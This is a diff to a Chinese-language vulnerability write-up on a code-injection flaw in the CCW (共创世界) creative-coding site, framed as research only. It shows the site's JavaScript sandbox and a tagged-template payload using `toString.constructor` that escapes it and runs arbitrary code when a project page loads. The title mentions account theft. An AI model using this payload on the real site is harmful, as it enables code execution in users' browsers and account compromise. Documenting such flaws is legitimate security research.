@@ -1,6 +1,6 @@
 记录共创世界的前端代码注入漏洞和可能的盗号方式。
 
-更新时间：北京时间 2026 年 5 月 10 日 21:04
+更新时间：北京时间 2026 年 5 月 10 日 21:36
 
 > [!WARNING]  
 > **仅供学习研究用途，请勿用于网络攻击，违者后果自负！！！**  
@@ -138,7 +138,7 @@ Content-Security-Policy: script-src 'none';
 
 2026 年 3 月 9 日，官方修改了代码注入漏洞积木的逻辑，但并没有修复漏洞，攻击者仍然能拿到全局 `window` 对象，仍然可以[从 React 提取 scratch-vm](https://github.com/bddjr/getScratchVMFromReact) 。
 
-如果您需要回滚到修改前的行为，请用 https://github.com/bddjr/CCWData-polyfill-eval 。
+如果您需要回滚到修改前的行为，请用 [CCWData-polyfill-eval](https://github.com/bddjr/CCWData-polyfill-eval) 。
 
 如果您想看旧版逻辑，请看 [before-20260309.md](before-20260309.md) 。
 
@@ -181,7 +181,35 @@ Content-Security-Policy: script-src 'none';
 }
 ```
 
-乍一看好像没啥问题，把 `key` 的 `()=` 这几个符号都过滤掉了，看起来好像没办法执行什么函数了……吗？  
+其中 `y.Br` 会调用另一个函数
+
+```js
+function p(t) {
+    var e = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {}
+        , r = ["fetch", "XMLHttpRequest", "WebSocket", "EventSource", "Worker", "alert", "confirm", "prompt", "setTimeout", "setInterval", "Function", "Image", "Audio", "Video", "open"]
+        , n = {}
+        , o = window.Function;
+    r.forEach((function(t) {
+        n[t] = window[t],
+        window[t] = null
+    }
+    ));
+    try {
+        var c = Object.keys(e)
+            , i = Object.values(e)
+            , s = '\n      "use strict";\n      const globalThis = null;\n      const window = null;\n      const document = null;\n      const alert = null;\n      const confirm = null;\n      const prompt = null;\n      const fetch = null;\n      const XMLHttpRequest = null;\n      const localStorage = null;\n      const sessionStorage = null;\n      const Image = null;\n      const Audio = null;\n      const Video = null;\n      const Worker = null;\n      const Function = null;\n      const open = null;\n      const history = null;\n      const location = null;\n      const navigator = null;\n      const global = null;\n      const self = null;\n      const top = null;\n      const parent = null;\n      const console = null;\n      '.concat(t)
+            , u = a(o, c.concat([s]));
+        return u.apply(void 0, i)
+    } finally {
+        r.forEach((function(t) {
+            window[t] = n[t]
+        }
+        ))
+    }
+}
+```
+
+乍一看好像没啥问题，把 `key` 的 `()=` 这几个符号都过滤掉了，而且还把一些变量设为 null ，看起来好像没办法执行什么函数了……吗？  
 
 ECMAScript 2015 新增了模板字符串功能，模板字符串可以执行函数，例如：
 
@@ -190,7 +218,8 @@ String.raw`C:\Development\profile\aboutme.html`
 ```
 
 经过我的研究，因为它输入给函数的参数0是一个数组，所以它不能直接调用 `eval` 执行字符串，  
-但它可以调用 `Function` 以创建函数，然后执行函数。
+但它可以调用 `Function` 以创建函数，然后执行函数。  
+`Function` 函数可以通过读取函数的 `.constructor` 获得，例如 `toString.constructor` 。  
 
 ```js
 toString.constructor`window.Function=toString.constructor;var msg='注入代码测试';console.log(msg,arguments)``${jsonObj}`
@@ -232,7 +261,11 @@ return rtObj
 toString.constructor`window.Function\x3dtoString.constructor;const\x20jsonObj\x3darguments[1];const\x20rtObj\x3d{jsonObj,"114":"514"};const{stringify}\x3dJSON;JSON.stringify\x3dfunction\x28o\x29{return\x20o\x3d\x3d\x3drtObj?\x28JSON.stringify\x3dstringify,o\x29:stringify.apply\x28this,arguments\x29};return\x20rtObj``${jsonObj}`
 ```
 
-以上代码配合 “当计时器 > -1” 的帽子，就可以在浏览器访问 creator 或 gandi 页面的链接后立即执行任意代码，或者在其它页面点击“立即运行”时立即执行任意代码。
+但是一些全局变量还是被污染的，如果想要干掉全局变量污染，可以用 [CCWData-polyfill-window](https://github.com/bddjr/CCWData-polyfill-window) 。  
+
+以上方法太麻烦了，如果想要添加 eval 积木，可以用 [CodeCrackWorld-v2](https://github.com/bddjr/CodeCrackWorld-v2) 。  
+
+以上代码配合 “当计时器 > -1” 的帽子，就可以在浏览器访问 creator 或 gandi 页面的链接后立即执行任意代码，或者在其它页面点击“立即运行”时立即执行任意代码。  
 
 ### setValueInJSON
 
